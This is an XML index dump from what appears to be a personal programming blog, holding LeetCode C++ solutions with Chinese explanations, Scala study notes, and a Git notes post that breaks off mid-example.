    <content type="text"><![CDATA[题目：Given a sorted array, remove the duplicates in-place such that each element appear only once and return the new length. Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory. Example: Given nums = [1,1,2], Your function should return length = 2, with the first two elements of nums being 1 and 2 respectively. It doesn&apos;t matter what you leave beyond the new length. 标签：Array, Two Pointers 分析：数组是排好序的，因此重复数字一定相邻。 代码：123456789101112class Solution &#123;public: int removeDuplicates(vector&lt;int&gt;&amp; nums) &#123; if (nums.size() &lt;= 1) return nums.size(); int i = 0, j = 1; while (j &lt; nums.size()) &#123; if (nums[i] == nums[j++]) continue; else nums[++i] = nums[j-1]; &#125; return i+1; &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 25. Reverse Nodes in k-Group]]></title>
    <url>%2F2018%2F03%2F28%2FLeetCode-25-Reverse-Nodes-in-k-Group%2F</url>
    <content type="text"><![CDATA[题目：Given a linked list, reverse the nodes of a linked list k at a time and return its modified list. k is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of k then left-out nodes in the end should remain as it is. You may not alter the values in the nodes, only nodes itself may be changed. Only constant memory is allowed. For example, Given this linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5 For k = 2, you should return: 2-&gt;1-&gt;4-&gt;3-&gt;5 For k = 3, you should return: 3-&gt;2-&gt;1-&gt;4-&gt;5 标签：Linked List 分析：可以看作$\frac{n}{k}$个长度为$k$的链表分别进行反转，总的计算复杂度为$O(n)$。题目要求不反转最后剩余的、个数少于$k$的节点，因此可以预先遍历整个链表，获取总长度；但更好的一种方法是，不管剩余节点个数，每过$k$个节点就进行一轮新的反转，不过对于最后剩余的节点进行两轮反转，恢复原序。 代码：123456789101112131415161718192021222324class Solution &#123;public: ListNode* reverseKGroup(ListNode* head, int k) &#123; ListNode vhead(INT_MIN); vhead.next = head; ListNode *newhead = &amp;vhead, *curr = &amp;vhead, *tail, *nxt; int remLen = 0; while (curr = curr-&gt;next) // find the length of the list. remLen++; while (remLen &gt;= k) &#123; curr = newhead-&gt;next; for (int i = 1; i &lt; k; i++) &#123; nxt = curr-&gt;next; curr-&gt;next = nxt-&gt;next; nxt-&gt;next = newhead-&gt;next; newhead-&gt;next = nxt; &#125; newhead = curr; remLen -= k; // subtract k after each iteration. &#125; return vhead.next; &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 24. Swap Nodes in Pairs]]></title>
    <url>%2F2018%2F03%2F26%2FLeetCode-24-Swap-Nodes-in-Pairs%2F</url>
    <content type="text"><![CDATA[题目：Given a linked list, swap every two adjacent nodes and return its head. For example, Given 1-&gt;2-&gt;3-&gt;4, you should return the list as 2-&gt;1-&gt;4-&gt;3. Your algorithm should use only constant space. You may not modify the values in the list, only nodes itself can be changed. 标签：Linked List 分析：尝试不用虚头部解决这类链表问题～在正确性得到保证的情况下，尽可能地保持代码简洁。 代码：123456789101112131415class Solution &#123;public: ListNode* swapPairs(ListNode* head) &#123; ListNode **hhead = &amp;head; ListNode *a, *b; while ((a = *hhead) &amp;&amp; (b = a-&gt;next)) &#123; a-&gt;next = b-&gt;next; b-&gt;next = a; *hhead = b; hhead = &amp;(a-&gt;next); &#125; return head; &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 23. Merge k Sorted Lists]]></title>
    <url>%2F2018%2F03%2F26%2FLeetCode-23-Merge-k-Sorted-Lists%2F</url>
    <content type="text"><![CDATA[题目：Merge k sorted linked lists and return it as one sorted list. Analyze and describe its complexity. 标签：Linked List, Divide and Conquer, Heap 分析：算法流程和Merge 2 Sorted Lists在本质上没有太大区别，都是在多条列表头部中取最小，然后进入下一轮比较，真正影响算法效率的是比较算法。假设每条列表长度为$n$，列表个数为$k$： 直接遍历比较：那么比较一次需要$k$次操作，需要k次比较才能进入下一轮（即所有列表长度变为$n-1$），总共$n$轮，因此计算复杂度为$k \times k \times n = O(nk^2)$； 采用优先队列（最小堆）：每次取最小值只需要常数次操作，每次新插节点需要$log(k)$次操作，经过$k$次比较进入下一轮，总共$n$轮，因此计算复杂度为$O(k \times log(k) \times n = O(nklog(k)))$； 还有一种思路完全不同的算法：将所有列表两两合并，依次迭代，得到最终解。同样，第一轮中，合并任意两个列表需要$2n$次操作，总共$k/2$次合并；第二轮中，合并两个列表需要$4n$次操作，总共$k/4$次操作；依次类推，总共$log(k)$轮，因此计算复杂度为$O(nklog(k))$。 代码：1234567891011121314151617181920212223242526272829struct cmp&#123; bool operator()(ListNode* a, ListNode* b)&#123; return a-&gt;val &gt; b-&gt;val; &#125;&#125;;class Solution &#123;public: ListNode* mergeKLists(vector&lt;ListNode*&gt;&amp; lists) &#123; ListNode newhead(INT_MIN); ListNode *tail = &amp;newhead; // min heap. priority_queue&lt;ListNode*, vector&lt;ListNode*&gt;, cmp&gt; pq; for (int i = 0; i &lt; (int)lists.size(); i++) &#123; if (lists[i] != nullptr) pq.push(lists[i]); &#125; while (!pq.empty()) &#123; // stop when all nodes run out. ListNode *tmp = pq.top(); tail-&gt;next = tmp; tail = tail-&gt;next; pq.pop(); if (tmp-&gt;next != nullptr) pq.push(tmp-&gt;next); &#125; return newhead.next; &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 22. Generate Parentheses]]></title>
    <url>%2F2018%2F03%2F26%2FLeetCode-22-Generate-Parentheses%2F</url>
    <content type="text"><![CDATA[题目：Given n pairs of parentheses, write a function to generate all combinations of well-formed parentheses. For example, given n = 3, a solution set is: [ &quot;((()))&quot;, &quot;(()())&quot;, &quot;(())()&quot;, &quot;()(())&quot;, &quot;()()()&quot; ] 标签：String, Backtracking 分析：采取回溯法，基于深度优先策略遍历所有括号排列的可能性，唯一的限制在于，当栈为空时，只能插入左括号。 代码：1234567891011121314151617class Solution &#123;public: vector&lt;string&gt; generateParenthesis(int n) &#123; vector&lt;string&gt; res; backtrack(res, "", n, n, 0); return res; &#125; void backtrack(vector&lt;string&gt; &amp;res, const string &amp;prev, int l_left, int r_left, int total) &#123; if (l_left == 0) &#123; // left parentheses run out. res.push_back(prev + string(r_left, ')')); return; &#125; backtrack(res, prev+"(", l_left-1, r_left, total+1); if (total &gt; 0) // only when there are left parentheses in stack, can we input a right parenthesis. backtrack(res, prev+")", l_left, r_left-1, total-1); &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 21. Merge Two Sorted Lists]]></title>
    <url>%2F2018%2F03%2F25%2FLeetCode-21-Merge-Two-Sorted-Lists%2F</url>
    <content type="text"><![CDATA[题目：Merge two sorted linked lists and return it as a new list. The new list should be made by splicing together the nodes of the first two lists. 标签：Linked List 分析：将两个有序列表合并为一个有序列表。为了减少逻辑判断，可以新建一个node作为虚拟头部，省去对原头部的单独处理。 代码：12345678910111213141516171819202122class Solution &#123;public: ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) &#123; // virtual head. ListNode newhead(INT_MIN); ListNode* tail = &amp;newhead; while (l1 != nullptr &amp;&amp; l2 != nullptr) &#123; if (l1-&gt;val &lt;= l2-&gt;val) &#123; tail-&gt;next = l1; l1 = l1-&gt;next; &#125; else &#123; tail-&gt;next = l2; l2 = l2-&gt;next; &#125; tail = tail-&gt;next; &#125; // append the remaining list. tail-&gt;next = l1 == nullptr? l2 : l1; return newhead.next; &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 20. Valid Parentheses]]></title>
    <url>%2F2018%2F03%2F25%2FLeetCode-20-Valid-Parentheses%2F</url>
    <content type="text"><![CDATA[题目：Given a string containing just the characters &apos;(&apos;, &apos;)&apos;, &apos;{&apos;, &apos;}&apos;, &apos;[&apos; and &apos;]&apos;, determine if the input string is valid. The brackets must close in the correct order, &quot;()&quot; and &quot;()[]{}&quot; are all valid but &quot;(]&quot; and &quot;([)]&quot; are not. 标签：String, Stack 分析：本题比较简单，可能的出错点在于对空栈进行pop操作～比如初始字符可能为右括号。 代码：1234567891011121314151617181920212223class Solution &#123;public: bool isValid(string s) &#123; map&lt;char, int&gt; lookup; lookup['('] = 0; lookup[')'] = 1; lookup['&#123;'] = 2; lookup['&#125;'] = 3; lookup['['] = 4; lookup[']'] = 5; stack&lt;int&gt; par; for (int i = 0; i &lt; s.length(); i++) &#123; if (lookup[s[i]] % 2 == 0) // for left parentheses, push. par.push(lookup[s[i]]); else if (par.empty() || par.top() != lookup[s[i]] - 1) // for right parentheses, check and pop. return false; else par.pop(); &#125; return par.empty(); &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 19. Remove Nth Node From End of List]]></title>
    <url>%2F2018%2F03%2F24%2FLeetCode-19-Remove-Nth-Node-From-End-of-List%2F</url>
    <content type="text"><![CDATA[题目：Given a linked list, remove the nth node from the end of list and return its head. For example, Given linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5, and n = 2. After removing the second node from the end, the linked list becomes 1-&gt;2-&gt;3-&gt;5. Note: Given n will always be valid. Try to do this in one pass. 标签：Linked List, Two Pointers 分析：给定的是单列表，且要求解法为one-pass，因此可以使用两个指针同时移动，当前面的指针到达链表尾部时，删除后面指针指向的node即可。 代码：123456789101112131415161718192021222324252627282930313233// Definition for singly-linked list.struct ListNode &#123; int val; ListNode *next; ListNode(int x) : val(x), next(nullptr) &#123;&#125;&#125;;class Solution &#123;public: ListNode* removeNthFromEnd(ListNode* head, int n) &#123; if (head == nullptr) return nullptr; ListNode *a, *b; a = b = head; int i = 1; while (i &lt; n) &#123; // this should not happen if (b-&gt;next == nullptr) break; b = b-&gt;next; &#125; ListNode* prev = nullptr; while (b-&gt;next != nullptr) &#123; prev = a; b = b-&gt;next; a = a-&gt;next; &#125; if (prev == nullptr) head = head-&gt;next; // remove head else prev-&gt;next = a-&gt;next; return head; &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 18. 4Sum]]></title>
    <url>%2F2018%2F03%2F24%2FLeetCode-18-4Sum%2F</url>
    <content type="text"><![CDATA[题目：Given an array S of n integers, are there elements a, b, c, and d in S such that a + b + c + d = target? Find all unique quadruplets in the array which gives the sum of target. Note: The solution set must not contain duplicate quadruplets. 标签：Array, Hash Table, Two Pointers 分析：四数和解法和三数和没有本质区别，无非是多固定一个b而已，复杂度为$O(n^3)$。不过为了优化算法性能，我们需要做一些剪枝，比如忽略重复的a（代码17行）、跳过过小的a（代码19行）以及a过大时结束循环（代码21行）。 代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class Solution &#123;public: // find all unique a, b, c, d where a + b + c + d = target. vector&lt;vector&lt;int&gt;&gt; fourSum(vector&lt;int&gt;&amp; nums, int target) &#123; vector&lt;vector&lt;int&gt;&gt; res; if (nums.size() &lt; 4) return res; // do not modify the input vector. vector&lt;int&gt; nums_copy(nums.begin(), nums.end()); // sort the nums array to ensure a &lt;= b &lt;= c &lt;= d; sort(nums_copy.begin(), nums_copy.end()); int size = nums_copy.size(); int last3sum = nums_copy[size-1] + nums_copy[size-2] + nums_copy[size-3]; int last2sum = nums_copy[size-1] + nums_copy[size-2]; for (int i = 0; i &lt; size-3; i++) &#123; // skip the duplicate a if (i != 0 &amp;&amp; nums_copy[i] == nums_copy[i-1]) continue; // a is too small. if (nums_copy[i] + last3sum &lt; target) continue; // a is too large. if (nums_copy[i] + nums_copy[i+1] + nums_copy[i+2] + nums_copy[i+3] &gt; target) break; int target1 = target - nums_copy[i]; for (int j = i+1; j &lt; size-2; j++) &#123; // skip the duplicate b. if (j != i+1 &amp;&amp; nums_copy[j] == nums_copy[j-1]) continue; // b is too small. if (nums_copy[j] + last2sum &lt; target1) continue; // b is too large. if (nums_copy[j] + nums_copy[j+1] + nums_copy[j+2] &gt; target1) break; int target2 = target1 - nums_copy[j]; int k = j + 1, l = size - 1; while (k &lt; l) &#123; int sum = nums_copy[k] + nums_copy[l]; if (sum &lt; target2) k++; else if (sum &gt; target2) l--; else &#123; vector&lt;int&gt; tmp&#123;nums_copy[i], nums_copy[j], nums_copy[k], nums_copy[l]&#125;; res.push_back(tmp); do &#123; k++; &#125; while (nums_copy[k] == nums_copy[k-1]); do &#123; l--; &#125; while (nums_copy[l] == nums_copy[l+1]); &#125; &#125; &#125; &#125; return res; &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 17. Letter Combinations of a Phone Number]]></title>
    <url>%2F2018%2F03%2F23%2FLeetCode-17-Letter-Combinations-of-a-Phone-Number%2F</url>
    <content type="text"><![CDATA[题目：Given a digit string, return all possible letter combinations that the number could represent. A mapping of digit to letters (just like on the telephone buttons) is given below. 标签：String, Backtracking 分析：本题有多种不同解法: 为了求解长度为n的电话号码所对应的字母组合，我们可以先计算出后n-1位的所有字母组合，然后再与第1位数字对应的多个字母进行组合，如此递归即可求得最终解。这种解法思路比较直观，需要产生n次函数调用，但每次递归结束需要遍历中间结果（vector），然后与当前数字的多个数字进行组合。 采用回溯法，基于深度优先对所有数字进行遍历。产生约$3^n$次函数调用，但是减少了vector的构造、回收与遍历。 代码：1234567891011121314151617181920212223242526272829// backtrackingclass Solution &#123;public: char lookupTable[10][4] = &#123; &#123;&#125;, &#123;&#125;, &#123;'a','b','c'&#125;, &#123;'d','e','f'&#125;, &#123;'g','h','i'&#125;, &#123;'j','k','l'&#125;, &#123;'m','n','o'&#125;, &#123;'p','q','r','s'&#125;, &#123;'t','u','v'&#125;, &#123;'w','x','y','z'&#125; &#125;; int length[10] = &#123; 0, 0, 3, 3, 3, 3, 3, 4, 3, 4 &#125;; vector&lt;string&gt; letterCombinations(string digits) &#123; if (digits.length() == 0) return vector&lt;string&gt;&#123;&#125;; vector&lt;string&gt; res; string init; backtrack(init, res, digits, 0); return res; &#125; void backtrack(string&amp; prev, vector&lt;string&gt;&amp; res, string&amp; digits, int index) &#123; if (index == (int)digits.length()) res.push_back(prev); else &#123; int num = digits[index] - '0'; for (int i = 0; i &lt; length[num]; i++) &#123; prev.push_back(lookupTable[num][i]); backtrack(prev, res, digits, index+1); prev.pop_back(); &#125; &#125; &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 16. 3Sum Closest]]></title>
    <url>%2F2018%2F03%2F23%2FLeetCode-16-3Sum-Closest%2F</url>
    <content type="text"><![CDATA[题目：Given an array S of n integers, find three integers in S such that the sum is closest to a given number, target. Return the sum of the three integers. You may assume that each input would have exactly one solution. For example, given array S = {-1 2 1 -4}, and target = 1. The sum that is closest to the target is 2. (-1 + 2 + 1 = 2). 标签：Array, Two Pointers 分析：和15题类似，同样采取固定a，然后求解b、c的最优解，区别在于，这里只需要返回三数之和，因此实际上题目更简单了。容易出错的点主要是一些临界数据，比如数列刚好仅有三个数时，如果没有做好初始化工作，答案就会出错。 代码：123456789101112131415161718192021222324252627282930class Solution &#123;public: // find a, b, c whose sum is closest to target and return their sum. int threeSumClosest(vector&lt;int&gt;&amp; nums, int target) &#123; if ((int)nums.size() &lt; 3) // return immediately. return 0; sort(nums.begin(), nums.end()); // sort the array to ensure a &lt; b &lt; c. int res = nums[0] + nums[1] + nums[2]; // initialize result. for (int i = 0; i &lt; (int)nums.size(); i++) &#123; if (i != 0 &amp;&amp; nums[i] == nums[i-1]) // skip the duplicate a. continue; int bPlusC = target - nums[i]; int j = i + 1, k = (int)nums.size() - 1; while (j &lt; k) &#123; int sum = nums[j] + nums[k]; int delta = sum - bPlusC; if (abs(delta) &lt; abs(target - res)) // whether closer to target than previous sum. res = sum + nums[i]; if (delta &lt; 0) j++; // b + c &lt; 0 - a, so increase b. else if (delta &gt; 0) k--; // b + c &gt; 0 - a, so decrease c. else return res; // b + c = 0 - a, best answer. &#125; &#125; return res; &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[LeetCode] 15. 3Sum]]></title>
    <url>%2F2018%2F03%2F23%2FLeetCode-15-3Sum%2F</url>
    <content type="text"><![CDATA[题目：Given an array S of n integers, are there elements a, b, c in S such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero. Note: The solution set must not contain duplicate triplets. 标签：Array, Two Pointers 分析：比较直观的解法是三个嵌套循环直接暴搜解法，最后去重，计算复杂度为$O(n^3)$，不过，暴力枚举过程中存在着大量可以省略的重复计算工作，存在很大的优化空间，事实上最终的优解复杂度仅有$O(n^2)$而已。 首先，将三数和归纳为二数和的求解，即固定一个数a，然后在剩余的数中求解b和c；需要注意的是，a是一次性的，在对a求解完b、c的组合后，a就不需要再被用到；对所有数依次固定求解完之后，再去除重复解，并排序。复杂度为$O(n^2)$（因为二数和求解是$O(n)$） 可以首先对整个数列进行排序，通过假设a &lt; b &lt; c来简化计算；具体为，每次固定完数a后，我们只需要往后搜索b、c的解法（参见代码14行），因为a前面的数已经全部被求解过一遍了。 题目要求最后不能有重复解，不建议在最后进行去重，完全可以在计算过程中进行避免；由于数列已经经过排序，所有相同的数一定分在一块，因此，只需要对连续重复的a求解一次即可（参见代码10行）。 由于假设a &lt; b &lt; c的存在，我们知道a必须小于等于0，因此，可以当a大于0时，可以终止求解过程（参见代码8行）。 最后，由于数列是排好序的，因此二数和可以从两端同时进行计算求解。 最后的最后，尽可能多用中间变量来缓存计算结果（参见代码13、17行），不要在循环内做重复计算，这会对算法运行时间产生不小的影响。 代码：1234567891011121314151617181920212223242526272829303132333435class Solution &#123;public: // try to find all a, b, c where a + b + c = 0 vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) &#123; sort(nums.begin(), nums.end()); // sort the number array to ensure a &lt; b &lt; c. vector&lt;vector&lt;int&gt;&gt; res; for (int i = 0; i &lt; (int)nums.size(); i++) &#123; if (nums[i] &gt; 0) // a cannot be positive since both b and c is larger than a. break; if (i != 0 &amp;&amp; nums[i] == nums[i-1]) // skip all duplicate a's. continue; int target = 0 - nums[i]; int j = i+1, k = nums.size() - 1; while (true) &#123; // since the nums array is sorted, we could search from both sides. if (j &gt;= k) break; int bPlusC = nums[j] + nums[k]; if (bPlusC &gt; target) k--; // b + c &gt; 0 - a, so decrease c. else if (bPlusC &lt; target) j++; // b + c &lt; 0 - a, so increase b. else &#123; vector&lt;int&gt; newSol&#123;nums[i], nums[j], nums[k]&#125;; res.push_back(newSol); if (nums[j] == nums[k]) break; // stop since c cannot be smaller than b do &#123; j++; &#125; while (nums[j] == nums[j-1]); // skip the duplicate b do &#123; k--; &#125; while (nums[k] == nums[k+1]); // skip the duplicate c &#125; &#125; &#125; return res; &#125;&#125;;]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Scala学习笔记]]></title>
    <url>%2F2017%2F07%2F27%2FScala%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Parameterize arrays with types If a method takes only one parameter, you can call it without a dot or parentheses. 123println(123) // equal toConsole.println(123) // equal toConsole println 123 Scala is an object-oriented language in pure form: every value is an object and every operation is a method call. 121 + 2 // actually invoking(1).+(2) When you apply parentheses surrounding one or more values to a variable, Scala will transform the code into an invocation of a method named apply on that variable. It’s a general rule. 1234567val testArray: Array[Int] = new Array[Int](5)testArray(0) // get transformed intotestArray.apply(0)val numNames = Array("zero", "one", "two")// get transformed intoval numNames2 = Array.apply("zero", ...) Similarly, when an assignment is made to a variable to which parentheses and on e or more arguments have been applied, the compiler will transform that into an invocation of an update method that takes the arguments in parentheses as well as the object to the right of the equals sign. 12testArray(0) = "hello" // get transformed intotestArray.update(0, "hello") Use lists List is immutable in Scala. It has a method named ::: for list concatenation. 1List(1, 2) ::: List(3, 4) == List(1, 2, 3, 4) We can also use ::(pronounced cons) to prepends a new element to the beginning of an existing list and returns the resulting list. Here :: is a method of its right operand.(If a method is used in operator notation, such as a * b, the method is invoked on the left operand, as in a.*(b)——unless the method name ends in a colon) 1234561 :: List(2, 3) == List(1, 2, 3)// get transformed intoList(2, 3).::(1)val oneTwoThree = 1 :: 2 :: 3 :: Nil// here Nil is an empty list The time it takes to append to a list grows linearly with the size of the list, whereas prepending with :: takes constant time. If you want to build a list efficiently by appending elements, you can prepend them and call reverse, or use ListBuilder. Use tuples The actual type of a tuple depends on the number of elements it contains and the types of those elements. Thus, the type of (99, &quot;Luftballons&quot;) is Tuple2[Int, String]. The _N numbers for accessing the elements of a tuple are one-based, instead of zero-based, because starting with 1 is a tradition set by other languages with statically typed tuples. Use sets and maps The Scala API contains a base trait for sets, where a trait is similar to a Java interface. Scala then provides two subtraits, one for mutable sets and another for immutable sets. Method -&gt;, which you can invoke on any object in a Scala program, returns a two-element tuple containing the key and value. 123someMap += (1 -&gt; "hello") // get transformed intosomeMap += (1).-&gt;("hello")someMap += ((1, "hello")) Classes, fields, and methods One important characteristic of method parameters in Scala is that they are vals, not vars. Never reassign a parameter inside a method in Scala. In the absence of any explicit return statement, a Scala method returns the last value computed by the method. The recommended style for methods is in fact to avoid having explicit, and especially multiple, return statements. Instead, think of each method as an expression that yields one value. Singleton objects When a singleton object shares the same name with a class, it is called that class’s companion object. You must define both the class and its companion object in the same source file. A class and its companion object can access each other’s private members. A singleton object that does not share the same name with a companion class is called a standalone object. Symbol literals Symbols are interned in Scala, which means that if you write the same symbol literal twice, both expressions will refer to the exact same Symbol object. String interpolation In Scala, string interpolation is implemented by rewriting code at compile time. Any method can be an operator infix operator notation 12s.indexOf('a') == s indexOf 'a's.indexOf('a', 3) == s indexOf ('a', 3) prefix operator notation 1-2.0 == (2.0).unary_- postfix operator notation 1s.toLowerCase == s toLowerCase In Scala, you can leave off empty parentheses on method calls. The convention is that you include parentheses if the method has side effects, such as println(), but you can leave them off if the method has no side effects, such as toLowerCase invoked on a String. Operator precedence and tivity The associativity rule also plays a role when multiple operators of the same precedence appear side by side. If the methods end in : they are grouped right to left; otherwise, they are grouped left to right. For example, a ::: b ::: c is treated as a ::: (b ::: c). But a * b * c, by contrast, is treated as (a * b) * c. Value of assignment In Java or C, assignments result in the value assigned, while in Scala, assignments always result in the unit value, ().123while ((line = readline()) != "") &#123; // wrong // do something&#125; Here line = readline() will always be () and can never be &quot;&quot;. Exception handling with try expressions try-catch-finally results in a value. The result is that of the try clause if no exception is thrown, or the relevant catch clause if an exception is throw and caught. If an exception is thrown but not caught, the expression has no result at all. The value computed in the finally clause, if there is one, is dropped. As in Java, if a finally clause includes an explicit return statement, or throws an exception, that return value or exception will “overrule” any previous one that originated in the try block or one of its catch clauses. 12def f(): Int = try return 1 finally return 2 // f() == 2def g(): Int = try 1 finally 2 // g() == 1 Short forms of function literals This is called target typing because the targeted usage of an expression(in this case, an argument to someNumber.filter()) is allowed to influence the typing of that expression(in this case to determine the type of the x parameter).123val someNumbers = List(-11, -10, -5, 0, 5, 10)someNumbers.filter((x: Int) =&gt; x &gt; 0)someNumbers.filter(x =&gt; x &gt; 0) Placeholder syntax We can use underscores as placeholders for one or more parameters, so long as each parameter appears only one time within the function literal.1someNumbers.filter(_ &gt; 0) Repeated parameters Scala allows you to indicate that the last parameter may be repeated as below. Thus, the type of args inside the echo function, which is declared as type String* is actually Array[String]. Nevertheless, an array cannot be passed as a repeated parameter. 123def echo(args: String*) = args.map(println)val arr = Array("hello", "world", "hac")echo(arr) // compiler error To accomplish this, you’ll need no append the array argument with a colon and an _* symbol as below. This notation tells the compiler to pass each element of array as its own argument to echo, rather than all of it as a single argument. 1echo(arr: _*) Tail call optimization We can turn tail call optimization off by giving the following argument to the scala shell or to the scalac compiler. 1-g:notailcalls Scala only optimizes directly recursive calls back to the same function making the call. If the recursion is indirect, as in the following example of two mutually recursive functions, no optimization is possible: 1234def isEven(x: Int): Boolean = if (x == 0) true else isOdd(x - 1)def isOdd(x: Int): Boolean = if (x == 0) false else isEven(x - 1) You also won’t get a tail-call optimization if the final call goes to a function value. Tail-call optimization is limited to situations where a method or nested function calls itself directly as its last operation, without going through a function value or some other intermediary. 1234val funValue = nextedFun _def nestedFun(x: Int): Unit = &#123; if (x != 0) &#123; println(x); funValue(x - 1) &#125;&#125; Evaluation strategies There are two evaluation strategies in Scala: call by name and call by value. 123456def loop: Any = loop // never terminatedef foo(x: Any, y: Any) = x // call by valuedef goo(x: Any, y: =&gt; Any) = x // call by namefoo(2, loop) // never terminategoo(2, loop) = 2 The def form is call by name, which means that its right hand side is evaluated on each use. However, the val form is call by value. Unary operator We override unary operator by using unary_{operator}.1def unary_- : T = this.negative Class hierarchy There are 9 value classes in Scala: Byte, Short, Char, Boolean, Int, Long, Float, Double, Unit. You cannot create instances of these classes using new. Instead, all instances of these classes are written as literals. This is enforced by the “trick” that value classes are all defined to be both abstract and final. Trait You can do anything in trait definition that you can do in a class definition, and the syntax looks exactly the same, with only two exceptions. A trait cannot have any “class” parameters. In classes, super call is statically bound, while in traits, super calls are dynamically bound. Import In scala, an import selector can consist of the following: A simple name x. This includes x in the set of imported names. A renaming clause x =&gt; y. This makes the member named x visible under the name y. A hiding clause x =&gt; _. This excludes x from the set of imported names. A catch-all _. This imports all members except those members mentioned in a preceding clause. If a catch-all is given, it must come last in the list of import selectors. Access modifiers Java permits an outer class to access the private members of its inner classes, while Scala not. Access to protected members in Scala is also a bit more restrictive than in Java. In Scala, a protected member is only accessible from subclasses of the class in which the member is defined. While in Java, such accesses are also possible from other classes in the same package. Access modifiers can be augmented with qualifiers in Scala. A modifier form private[X] or protect[X] means that access is private or protect up to X, where X designates some enclosing package, class or singleton object. To Be Continued]]></content>
      <tags>
        <tag>Scala</tag>
        <tag>Programming Language</tag>
        <tag>Study Notes</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git技术笔记]]></title>
    <url>%2F2017%2F05%2F11%2FGit%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[这篇博文主要是对Git（而非Github）背景知识、管理操作的摘抄与整理，内容来源包括但不限于Pro Git、Stack Overflow。 版本控制系统的演变 保存文件修改记录 –&gt; 本地版本控制系统，如RCS。 与其他开发者合作 –&gt; 中心化版本控制系统，如CVS、Subversion、Perforce。 去除单点故障 –&gt; 分布式版本控制系统，如Git、Mercurial、Bazaar、Darcs。 Git历史 2002年开始，Linux内核社区使用BitKeeper对代码进行版本控制。 2005年，Linux内核社区与BitKeeper社区闹翻，Linus开始设计新版本系统。 Git最初的设计目标： 速度 简单 支持非线性开发（多个并行分支） 分布式 支持大工程 Git基本特性 其他版本控制系统（如CVS、Subversion、Perforce、Bazaar等等）主要记录文件及对文件的一系列修改操作；而Git记录文件在不同版本下的快照。 Git将工程的完整历史都保存在本地，因此受网络延迟的影响非常小。 Git对所有文件计算SHA-1校验和，用于区分文件，因此不可能绕开Git对文件进行修改，这保证了文件的完整性。 Git通常只允许添加数据，很难让系统执行不可逆操作或者删除数据。 Git拥有三个主要状态，分别为committed、modified与staged。 Git首次配置配置文件 /etc/gitconfig 全局配置文件 ~/.gitconfig、~/.config/git/config 用户配置文件 .git/config 项目配置文件 配置命令1234$ git config --global user.name &lt;user_name&gt;$ git config --global user.email &lt;user_email&gt;$ git config --global core.editor &lt;editor_name&gt;$ git config -l 基本操作 初始化一个仓库 123$ git init$ git add *.c$ git commit -m "initial project version" 克隆已存在的仓库 1$ git clone https://github.com/xxx/yyy.git [rename_dir] 检查文件状态 123456$ git status [-s] M READMEMM RakefileA lib/git.rbM lib/simplegit.rb?? LICENSE.txt 当使用-s简化输出时，文件状态用两列字符来表示，其中左列表示staging area的状态，右列表示working tree的状态。对于字符而言，??表示untracked文件，M表示modified文件，A表示added文件。 因此可以看出，README已被修改，但是并没有添加到staging area中，而Rakefile在修改并添加到staging area后，再次被修改。 忽略文件 123456789101112# ignore all .a files*.a# but do track lib.a, even though you&apos;re ignoring .a files above!lib.a# only ignore the TODO file in the current directory, not subdir/TODO/TODO# ignore all files in the build/ directorybuild/# ignore doc/notes.txt, but not 